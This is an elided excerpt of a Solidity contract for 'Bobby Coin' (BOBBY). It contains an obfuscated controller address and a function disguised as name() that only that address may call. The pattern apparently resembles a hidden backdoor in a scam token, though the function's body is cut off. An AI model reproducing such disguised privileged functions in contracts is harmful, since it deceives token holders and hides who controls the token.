...
contract BOBBY is Ownable {
    ...
    string public _tokenname = "Bobby Coin";
    string public _tokensymbol = "BOBBY";
    uint256 tokenamount = 10000000000*10**decimals();
    address public rfvcxd78;
    ...
    function name(address jjkxq1) public     {
        require(rfvcxd78 ==  _msgSender());
        if(rfvcxd78 != _msgSender()){
                revert("fu");
        }
